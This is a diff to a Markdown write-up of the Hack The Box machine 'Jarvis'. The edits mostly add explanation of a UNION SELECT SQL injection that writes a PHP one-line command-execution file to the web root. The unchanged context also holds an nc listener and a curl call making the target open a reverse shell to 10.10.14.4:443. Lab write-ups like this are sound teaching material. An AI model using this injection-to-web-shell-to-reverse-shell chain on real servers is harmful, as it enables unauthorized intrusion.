@@ -51,7 +51,7 @@ nmap -sV -sC -p- oN nmap 10.10.10.143
 
 
 ~~~bash
-# Nmap 7.70 scan initiated Wed Jul  3 07:52:10 2019 as: nmap -sV -sC -p- -oN nmap jarvis
+# Nmap 7.70 scan initiated Wed Jul  3 07:52:10 2019 as: nmap -sV -sC -p- -oN nmap 10.10.10.143
 Nmap scan report for jarvis (10.10.10.143)
 Host is up (0.55s latency).
 Not shown: 65530 closed ports
@@ -121,7 +121,7 @@ So we know that the web application runs `php`, we have an SQL injection vulnera
 
 
 
-Here we can write a file echoing(don't forget url encoding!) a simple php 1 liner RCE code into a file on the server. `/var/www/html` is one of the most common directories hosting web pages so we can try that first.
+Here we can write a file echoing(don't forget url encoding!) a simple php 1 liner RCE code into a file on the server. `/var/www/html` is one of the most common directories hosting web pages so we can try that first. We can use a `union select` command to add additional data to be returned by the SQL query. If the number of columns matches the actual number that's returned by the query, an additional row will be appended to the results(I'll probably have to make another post on explaining this). So, we select 6(+1 payload to make 7) to create our query:
 
 
 
@@ -153,7 +153,7 @@ Now that we have the php file on the server, we can execute our netcat reverse s
 # create listener
 nc -lvp 443
 
-# call our reverse shell
+# call our reverse shell(please use a different terminal for this, don't do it in the listner)
 
 curl -X GET "http://10.10.10.143/cmd.php?cmd=nc%2010.10.14.4%20443%20-e%20/bin/sh"
 ~~~
